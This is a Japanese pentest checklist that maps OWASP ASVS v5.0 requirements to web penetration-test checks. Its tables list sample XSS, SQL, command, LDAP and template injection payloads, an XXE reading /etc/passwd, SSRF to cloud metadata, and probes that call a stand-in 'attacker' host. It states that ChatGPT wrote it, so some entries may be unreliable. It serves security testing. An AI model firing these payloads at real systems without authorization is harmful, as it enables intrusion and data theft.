# ASVS(v5.0) mapping
- 本サマリは ASVS v5.0 の V1〜V17 を前提資料として、Webペネトレーションテスト（WebPT）で実施・判定しやすい検査観点を抽出と攻撃方法サンプルをまとめたもの。
- ASVSの各説明は要点なので詳細は下記リンクから確認。
- 範囲外は主に「設計/運用/文書レビュー中心」「構成監査のみで実挙動からは検証困難」などを理由とする。
- 記載内容はChatGPTによって作成しているため、使用時は要確認。

## 対象URL
- [ASVS](https://github.com/owasp-ja/asvs-ja/tree/master/5.0/ja)
- [WSTG](https://owasp.org/www-project-web-security-testing-guide/)
---
## V1.1 エンコーディングおよびサニタイゼーションアーキテクチャ

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- |
| V1.1.1 | L2 | 入力は一度だけ標準形式にデコード／アンエスケープされ、処理前に行うこと（入力バリデーション後に行わない）。 | 対応可 | 入力のエンコード経路観察、二重デコードの検出（リクエスト差分／侵入テスト） | [WSTG-INPV-01](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting)/[PortSwigger WSA](https://portswigger.net/web-security/cross-site-scripting/reflected)/[PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/)/[CWE-174](https://cwe.mitre.org/data/definitions/174.html) | `%253Cscript%253Ealert(1)%253C/script%253E` を送信し二重デコードで `<script>` 実行 | 単一エンコードと二重エンコードの挙動差／反射位置でスクリプト実行を確認 |
| V1.1.2 | L2 | 出力エンコーディング／エスケープは最終ステップで行うこと（インタプリタに渡す直前）。 | 対応可 | 出力のエンコード方法の検証（反射・保存型ペイロードで確認） | [WSTG-INPV-02](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting)/[PortSwigger WSA](https://portswigger.net/web-security/cross-site-scripting/stored)/[PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/)/[CWE-79](https://cwe.mitre.org/data/definitions/79.html) | 掲示板に `<img src=x onerror=alert(1)>` を保存し表示時に実行 | 保存→閲覧で未エスケープにより XSS が発火する事実を確認 |


---

## V1.2 インジェクション防御

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- |
| V1.2.1 | L1 | HTML/HTTP/CSS/コメント等、各コンテキストに応じた出力エンコードを行うこと。 | 対応可 | XSS向けペイロードテスト、レスポンスコンテキスト解析 | [WSTG-INPV-01](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting)/[PortSwigger WSA](https://portswigger.net/web-security/cross-site-scripting/contexts)/[PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/)/[CWE-116](https://cwe.mitre.org/data/definitions/116.html) | `"><script>alert(1)</script>` を各入力で反射確認 | 反射位置（HTML本文/属性/JS）別に実行可否を観察しエンコード欠如を特定 |
| V1.2.2 | L1 | 動的URL構築時はコンテキストに応じたエンコードを行い、危険なプロトコルを許可しない。 | 対応可 | URL生成点のパラメータ操作、プロトコルスキーム検証（javascript:, data: 等拒否） | [WSTG-CLNT-04](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect)/[PortSwigger WSA](https://portswigger.net/web-security/dom-based/client-side-json-injection)/[PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/Open%20Redirect/)/[CWE-601](https://cwe.mitre.org/data/definitions/601.html) | `next=//evil.tld` や `next=javascript:alert(1)` で遷移/実行誘発 | 外部ドメイン遷移や危険スキーム受理の事実を確認 |
| V1.2.3 | L1 | 動的に構築する JS/JSON コンテンツは構造を破壊しないようにエンコードすること（JS/JSON 注入防止）。 | 対応可 | JSON/JS を出力するエンドポイントに対するインジェクションテスト | [WSTG-CLNT-02](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/02-Testing_for_JavaScript_Execution)/[PortSwigger WSA](https://portswigger.net/web-security/dom-based/client-side-json-injection)/[CWE-79](https://cwe.mitre.org/data/definitions/79.html) | JSON値に `";alert(1);//` を混入させスクリプト実行を狙う | 生成スクリプトの構文崩壊や実行発火を観察し不適切エンコードを特定 |
| V1.2.4 | L1 | DB クエリはパラメータ化／ORM 等で保護し、SQL インジェクションを防ぐこと。 | 対応可 | SQLi ペイロード（盲目含む）、エラーベース／時間差検査 | [WSTG-INPV-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)/[PortSwigger WSA](https://portswigger.net/web-security/sql-injection)/[PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/)/[CWE-89](https://cwe.mitre.org/data/definitions/89.html) | `' OR 1=1--`、`'\|\|pg_sleep(5)\|\|'` 等で抽出/遅延を誘発 | レスポンス差/時間差/エラー情報からクエリ介入の成立を確認 |
| V1.2.5 | L1 | OS コマンド呼び出しは適切に保護（パラメータ化やエンコード）されていること。 | 対応可 | コマンドインジェクションペイロードによる検査（入力→外部影響確認） | [WSTG-INPV-12](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection)/[PortSwigger WSA](https://portswigger.net/web-security/os-command-injection)/[PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/Command%20Injection/)/[CWE-78](https://cwe.mitre.org/data/definitions/78.html) | `;sleep 5;#` や `& ping -c 1 attacker` 等で時間/外部呼出し検証 | 応答遅延や OOB 監視でコマンド実行の事実を確認 |
| V1.2.6 | L2 | LDAP インジェクション対策が施されていること。 | 対応可 | LDAP クエリに関する入力を用いた検査（LDAP ベースの機能が存在する場合） | [WSTG-INPV-06](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection)/[PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/LDAP%20Injection/)/[CWE-90](https://cwe.mitre.org/data/definitions/90.html)/[RFC 4515](https://datatracker.ietf.org/doc/html/rfc4515) | `*)(\|(uid=*))` 等でフィルタ合成し認証回避 | 結果件数の異常や認証回避でフィルタ注入成立を確認 |
| V1.2.7 | L2 | XPath/XQuery 等に対するパラメータ化・保護を行うこと。 | 対応可 | XML/XPath を利用する機能に対するペイロード検査 | [WSTG-INPV-09](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection)/[PortSwigger WSA](https://portswigger.net/web-security/dom-based/client-side-xpath-injection)/[PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/XPath%20Injection/)/[CWE-643](https://cwe.mitre.org/data/definitions/643.html) | `a' or '1'='1` / `] \| * \| a[1=1]` 等で照合回避 | 認証/検索結果の不正拡大で XPath 注入を確認 |
| V1.2.8 | L2 | LaTeX 等外部プロセッサは安全に構成（例: shell-escape 無効）されること。 | 範囲外 | 設定確認を推奨（ドキュメント生成機能が対象の場合は限定検査） | - | - | - |
| V1.2.9 | L2 | 正規表現内の特殊文字を適切にエスケープして誤解釈を防ぐこと。 | 対応可 | 正規表現処理を伴う入力処理の挙動確認（ReDoS 予兆の検査） | [WSTG-INPV-11](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_Code_Injection)/[OWASP ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)/[PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/Regular%20Expression/)/[CWE-1333](https://cwe.mitre.org/data/definitions/1333.html) | 入力に `.*$` や `(\w+)+$` などを混入し意図外マッチ/評価遅延を誘発 | 想定外のマッチ成立や顕著な処理遅延を観測し不適切な正規表現処理を特定 |
| V1.2.10 | L3 | CSV／スプレッドシートインジェクション対策（RFC4180 準拠、先頭特殊文字をクオート等）。 | 対応可 | CSV エクスポート機能に対するフィールド先頭文字検査（エクスポート結果の検査） | [WSTG-BUSL-09](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files)/[CSVi](https://owasp.org/www-community/attacks/CSV_Injection)/[CWE-1236](https://cwe.mitre.org/data/definitions/1236.html)/[PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/CSV%20Injection/)| `=HYPERLINK("http://attacker","X")` や `@SUM(1,1)` をセル先頭に含む値を登録→エクスポート | 表計算ソフトで式評価・リンク外出し等が発生する事実を確認 |


## V1.3 サニタイゼーション

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- |
| V1.3.1 | L1 | WYSIWYG 等からの HTML は既知の安全なサニタイズライブラリで処理すること。 | 対応可 | 保存型 XSS の検証、サニタイズ漏れテスト | [4.7.2 / WSTG-INPV-02](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting)/[PortSwigger WSA](https://portswigger.net/web-security/cross-site-scripting/stored)/[PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/)/[CWE-79](https://cwe.mitre.org/data/definitions/79.html) | WYSIWYG に `<img src=x onerror=alert(1)>` を保存 | 別ユーザで閲覧して JS 実行（保存型 XSS の発火）を確認。反映箇所の出力エスケープ有無を確認。 |
| V1.3.2 | L1 | eval() や SpEL 等の動的コード実行を使用しない／使用時は入力をサニタイズすること。 | 対応可 | 動的評価が疑われる箇所のペイロード検査（危険箇所の発見） | [4.7.11 / WSTG-INPV-11](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_Code_Injection)/[PortSwigger WSA](https://portswigger.net/web-security/server-side-template-injection)/[PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/Java/)/[CWE-94](https://cwe.mitre.org/data/definitions/94.html) | `${T(java.lang.Runtime).getRuntime().exec('id')}` 等の SpEL を入力に混入 | 式評価が行われる入力点へ送信し、サーバ側の実行/例外や機能逸脱の発生を観測。 |
| V1.3.3 | L2 | 危険なコンテキストへ渡すデータは事前サニタイズ・長さ制限等を実施すること。 | 対応可 | 長さや許可文字検査、入力整合性の確認 | [4.7.1 / WSTG-INPV-01](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting)/[PortSwigger WSA](https://portswigger.net/web-security/cross-site-scripting/contexts)/[PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/)/[CWE-79](https://cwe.mitre.org/data/definitions/79.html) | `q="><script>alert(1)</script>` をパラメータに付与 | 反射表示でスクリプト実行が起こるか（反射型 XSS）を確認。 |
| V1.3.4 | L2 | SVG 等スクリプト可能コンテンツはスクリプトや foreignObject を含まないよう検証／サニタイズすること。 | 対応可 | SVG を受け付ける機能に対する検査（表示と挙動） | [WSTG-BUSL-09](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files)/[PortSwigger WSA](https://portswigger.net/web-security/file-upload)/[PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/Upload%20Insecure%20Files/)/[CWE-434](https://cwe.mitre.org/data/definitions/434.html) | `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>` をアップロード | 表示時にスクリプトが実行されないこと、危険要素（script/foreignObject）が除去されることを確認。 |
| V1.3.5 | L2 | Markdown/CSS/XSL/BBCode 等はサニタイズまたは無効化すること。 | 対応可 | ユーザ生成コンテンツのレンダリング経路でのインジェクション検査 | [WSTG-CLNT-03](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection)/[PortSwigger WSA](https://portswigger.net/web-security/cross-site-scripting/dangling-markup)/[PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/)/[HackTricks](https://book.hacktricks.wiki/pentesting-web/xss-cross-site-scripting/xss-in-markdown) | Markdown の `[x](javascript:alert(1))`、スタイル挿入 `color=red;}</style><script>alert(1)</script>` 等 | レンダリング結果で意図しない HTML/CSS が反映・実行されないか確認（許可タグ/属性の制限確認）。 |
| V1.3.6 | L2 | SSRF 対策としてプロトコル・ドメイン・パス・ポートの許可リスト検証とサニタイズを行うこと。 | 対応可 | SSRF ペイロード／外部接続検証（リクエスト先制御の検査） | [4.7.19 / WSTG-INPV-19](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery)/[PortSwigger WSA](https://portswigger.net/web-security/ssrf)/[PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Request%20Forgery/)/[CWE-918](https://cwe.mitre.org/data/definitions/918.html) | `url=http://169.254.169.254/latest/meta-data/`、`gopher://...` 等 | 内部向けリソースへのアクセス可否や応答差分、DNS/リクエストログを確認（SSRF 成立）。 |
| V1.3.7 | L2 | テンプレート生成をユーザ入力ベースで動的に許可しないこと。 | 対応可 | テンプレートエンジン利用箇所のテンプレート注入検査 | [4.7.18 / WSTG-INPV-18](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection)/[PortSwigger WSA](https://portswigger.net/web-security/server-side-template-injection)/[PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/)/[CWE-94](https://cwe.mitre.org/data/definitions/94.html) | `{{7*7}}` や `{{().__class__.__mro__}}` 等（エンジン依存） | 出力に演算結果が出る/オブジェクト走査が可能か等のレスポンス変化で SSTI を判定。 |
| V1.3.8 | L2 | JNDI クエリ等は信頼できない入力をサニタイズし安全に構成すること。 | 対応可 | JNDI 利用箇所があればテンプレート注入等を検査 | [4.7.6 / WSTG-INPV-06](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection)/[PortSwigger](https://portswigger.net/kb/issues/00200400_ldap-injection)/[PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/LDAP%20Injection/)/[CWE-90](https://cwe.mitre.org/data/definitions/90.html) | `(&(uid=admin)(\|(uid=*)))` 等でフィルタを拡張 | 認証/検索結果が想定外に拡張されるかを観測（LDAP インジェクション）。 |
| V1.3.9 | L2 | memcache 送信前のサニタイズを行いインジェクションを防ぐこと。 | 対応可 | キャッシュに関連する入力の検査（キャッシュ汚染の観察） | [4.7.17 / WSTG-INPV-17](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection)/[PortSwigger WSA](https://portswigger.net/web-security/host-header)/[PortSwigger WSA](https://portswigger.net/web-security/web-cache-poisoning)/[CWE-436](https://cwe.mitre.org/data/definitions/436.html) | `Host: attacker.com` などでキャッシュ汚染（パスワードリセットリンク等の生成元改変） | 複数クライアントから同一 URL 取得で汚染コンテンツが配信されることを確認（Web Cache Poisoning）。 |
| V1.3.10 | L2 | フォーマット文字列が予期せぬ解決をしないよう事前サニタイズすること。 | 対応可 | フォーマット処理を伴う機能の入力検査 | [4.7.13 / WSTG-INPV-13](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/13-Testing_for_Format_String_Injection)/[OWASP](https://owasp.org/www-community/attacks/Format_string_attack)/[HackTricks](https://hacktricks.xsx.tw/binary-exploitation/format-strings/format-strings-template)/[CWE-134](https://cwe.mitre.org/data/definitions/134.html) | `%x%x%x` や `%n` をログ/テンプレータに渡す | 例外・情報漏えい・クラッシュ等の発生を確認（フォーマット文字列インジェクション）。 |
| V1.3.11 | L2 | SMTP/IMAP 等メール注入対策のため、メール送信前のサニタイズを行うこと。 | 対応可 | メール送信機能の入力検査（ヘッダ注入等） | [4.7.10 / WSTG-INPV-10](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/10-Testing_for_IMAP_SMTP_Injection)/[PortSwigger](https://portswigger.net/kb/issues/00200800_smtp-header-injection)/[PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/CRLF%20Injection/)/[CWE-147](https://cwe.mitre.org/data/definitions/147.html) | ヘッダに `\r\nBcc: victim@example.com`、IMAP コマンド挿入 | ヘッダ改変/コマンド実行・誤配送やリレー発生の有無を確認。 |
| V1.3.12 | L3 | 正規表現による ReDoS を防ぐため、指数的バックトラッキング要素がないことを保証すること。 | 範囲外 | ReDoS 予兆検査（負荷試験的手法） | - | - | - |


---

## V1.4 メモリ、文字列、アンマネージドコード

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- |
| V1.4.1 | L2 | メモリ安全な文字列操作／安全なメモリコピー等を使用してバッファオーバーフローを防ぐこと。 | 範囲外 | バイナリ／ビルド検査が必要（WebPT は限定的） | - | - | - |
| V1.4.2 | L2 | 整数オーバーフロー防止のため符号・範囲・バリデーションを行うこと。 | 範囲外 | 実装／ビルド確認推奨 | - | - | - |
| V1.4.3 | L2 | 動的メモリ解放とダングリングポインタ対策（use-after-free 防止）。 | 範囲外 | 主に開発時／ビルド時検査対象 | - | - | - |

---

## V1.5 安全なデシリアライゼーション

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- |
| V1.5.1 | L1 | XML パーサを制限構成にして XXE 等を防止する（外部エンティティ無効化等）。 | 対応可 | XXE 攻撃ペイロードによる検査（XML エンドポイント） | [4.7.7 / WSTG-INPV-07](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection)/[PortSwigger WSA](https://portswigger.net/web-security/xxe)/[PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/XXE%20Injection/)/[CWE-611](https://cwe.mitre.org/data/definitions/611.html) | `<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><a>&xxe;</a>` | エンドポイントに送信し外部エンティティ解決や内部ファイル露出・外部通信の有無を確認。 |
| V1.5.2 | L2 | デシリアライズ時は型ホワイトリスト等で許可型を限定し、安全でないメカニズムは信頼できない入力で使用しない。 | 対応可 | デシリアライズ対象の入力を操作して異常挙動検査（挙動検証） | [4.7.11 / WSTG-INPV-11](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_Code_Injection)/[PortSwigger WSA](https://portswigger.net/web-security/deserialization)/[PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/Insecure%20Deserialization/)/[CWE-502](https://cwe.mitre.org/data/definitions/502.html) | Java のシリアライズオブジェクト（例: ysoserial/CommonsCollections1）を送付 | サーバ側の例外/挙動変化や任意コード実行の兆候を確認（安全な検証環境で）。 |
| V1.5.3 | L3 | 各種パーサ（JSON/XML/URL）が同一の解析・エンコードを行うよう一貫性を保つこと（相互運用性の問題回避）。 | 対応可 | 異なるパーサを用いる箇所があれば差分解析の検査 | [4.7.4 / WSTG-INPV-04](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution)/[PortSwigger WSA](https://portswigger.net/web-security/api-testing/server-side-parameter-pollution)/[PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/HTTP%20Parameter%20Pollution/)/[CWE-235](https://cwe.mitre.org/data/definitions/235.html) | `?role=user&role=admin`／`a=1; a=2` 等の重複/汚染でバックエンドとフロントの解釈差を誘発 | 最初/最後勝ちや配列化などのパース差で権限や処理結果が変わるかを確認（HPP）。 |



# V2 バリデーションとビジネスロジック
---

## V2.1 バリデーションとビジネスロジックドキュメント

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
| V2.1.1 | L1 | 期待される構造に対する入力バリデーションルールを文書化 | 範囲外 | ドキュメント要求・ヒアリングで確認 | - | - | - |
| V2.1.2 | L2 | 組合せデータの論理・コンテキスト整合の検証手順を文書化 | 範囲外 | 同上 | - | - | - |
| V2.1.3 | L2 | ユーザ別/全体のビジネス制限・バリデーション期待事項を文書化 | 範囲外 | 同上 | - | - | - |

---

## V2.2 入力バリデーション

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
| V2.2.1 | L1 | 肯定的バリデーション（許容値/パターン/範囲/構造）を適用 | 対応可 | 代表入力の境界値/無効値テスト、スキーマ差分検証 | [WSTG-INPV-20](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/20-Testing_for_Mass_Assignment)/[PortSwigger WSA](https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability)/[PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/Hidden%20Parameters/)/[CWE-915](https://cwe.mitre.org/data/definitions/915.html) | オートバインドを悪用しフォームに無い `role=admin` / `isAdmin=true` を追加 | 非表示/未公開属性を追加送信し反映・権限上昇が起これば検出 |
| V2.2.2 | L1 | 信頼できるサーバ側レイヤでバリデーション実施（クライアント依存しない） | 対応可 | クライアント検証バイパス→サーバ側応答確認 | [WSTG-BUSL-02](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/02-Test_Ability_to_Forge_Requests)/[PortSwigger WSA](https://portswigger.net/web-security/logic-flaws)/[PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/Hidden%20Parameters/)/[CWE-602](https://cwe.mitre.org/data/definitions/602.html)/[CWE-472](https://cwe.mitre.org/data/definitions/472.html) | GUI非表示のフラグや値を改変して直接POST（例：割引適用フラグの再利用） | プロキシから不正値/隠しパラメータを送信し受理・状態変化すれば検出 |
| V2.2.3 | L2 | 関連項目の整合チェック（事前定義ルール準拠） | 対応可 | 相関パラメータ改変での不整合誘発テスト | [WSTG-BUSL-03](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/03-Test_Integrity_Checks)/[PortSwigger WSA](https://portswigger.net/web-security/logic-flaws)/[PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/Business%20Logic%20Errors/)/[CWE-840](https://cwe.mitre.org/data/definitions/840.html) | `単価×数量≠請求額` を送信／権限外プロジェクトIDへ差し替え | 相関を壊した入力で保存/反映・権限逸脱が起これば検出 |

---

## V2.3 ビジネスロジックのセキュリティ

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
| V2.3.1 | L1 | 手順省略不可の正しいフロー実行 | 対応可 | ステップスキップ/順序変更の試行 | [WSTG-BUSL-06](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/06-Testing_for_the_Circumvention_of_Work_Flows)/[PortSwigger WSA](https://portswigger.net/web-security/logic-flaws)/[PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/Business%20Logic%20Errors/)/[CWE-841](https://cwe.mitre.org/data/definitions/841.html) | 決済フローを飛ばして確定APIを直叩き／承認前に次工程へ進む | 手順入替/直アクセスで完了や副作用が成立すれば検出 |
| V2.3.2 | L2 | 文書化されたロジック制限の実装徹底 | 対応可 | 制限回避シナリオの作成・検証 | [WSTG-BUSL-02](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/02-Test_Ability_to_Forge_Requests)/[PortSwigger WSA](https://portswigger.net/web-security/logic-flaws)/[PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/Hidden%20Parameters/)/[CWE-602](https://cwe.mitre.org/data/definitions/602.html)/[CWE-472](https://cwe.mitre.org/data/definitions/472.html) | GUIで無効の隠し機能/デバッグフラグを有効化して送信 | 仕様で禁止の値/機能を直接送信し受理・動作すれば検出 |
| V2.3.3 | L2 | ロジックレベルでのトランザクション整合（成功/ロールバック） | 対応可 | 中間失敗時の不整合発生有無を確認 | [WSTG-BUSL-06](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/06-Testing_for_the_Circumvention_of_Work_Flows)/[PortSwigger WSA](https://portswigger.net/web-security/logic-flaws)/[PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/Business%20Logic%20Errors/)/[CWE-841](https://cwe.mitre.org/data/definitions/841.html) | 中間で失敗させた後にポイント/在庫が戻らない等の巻戻り不全を誘発 | 途中中断→副作用のロールバック欠如を観測できれば検出 |
| V2.3.4 | L2 | ロジックロックで限定資源の二重確保防止 | 対応可 | 競合・同時実行テスト（軽負荷で） | [WSTG-BUSL-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/05-Test_Number_of_Times_a_Function_Can_Be_Used_Limits)/[PortSwigger WSA](https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun)/[PortSwigger WSA 2](https://portswigger.net/web-security/race-conditions)/[PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/Race%20Condition/)/[CWE-770](https://cwe.mitre.org/data/definitions/770.html) | 座席/在庫の二重予約、割引クーポン複数適用 | 連続/並列実行で上限超過が成立すれば検出 |
| V2.3.5 | L3 | 高価値フローの多者承認 | 範囲外 | 手続/運用設計の確認 | - | - | - |

---

## V2.4 アンチオートメーション

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
| V2.4.1 | L2 | レート制限/クォータ/高コスト機能保護等のアンチオートメーション | 対応可 | レート超過挙動・CAPTCHA/トークン有無の確認 | [WSTG-BUSL-07](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/07-Test_Defenses_Against_Application_Misuse)/[PortSwigger WSA](https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block)/[PortSwigger WSA 2](https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits)/[CWE-799](https://cwe.mitre.org/data/definitions/799.html)/[OWASP Automated Threats](https://owasp.org/www-project-automated-threats-to-web-applications/) | 高速スクリプトで高コストAPI連打/アカウント作成やコード総当たり | しきい値超のレートで送信しブロック/遅延/追加認証が無ければ検出 |
| V2.4.2 | L3 | 人間らしいタイミング要求（過度に速い送信を抑止） | 対応可 | 連打・自動化送信時の拒否/遅延を確認 | [WSTG-BUSL-04](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/04-Test_for_Process_Timing)/[PortSwigger WSA](https://portswigger.net/web-security/race-conditions)/[PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/Race%20Condition/)/[CWE-799](https://cwe.mitre.org/data/definitions/799.html) | 人間では不可能な間隔でフォーム連投／長時間セッション保持で価格固定悪用 | 速すぎる/長時間の操作に対する拒否・タイムアウトが無ければ検出 |

## V3.1 Web フロントエンドセキュリティドキュメント

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
| V3.1.1 | L3 | 想定ブラウザの必須セキュリティ機能（HTTPS/HSTS/CSP等）と非対応時の動作をドキュメント化 | 範囲外 | ヒアリング・設計資料入手で確認 | - | - | - |

---

## V3.2 意図しないコンテンツ解釈

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
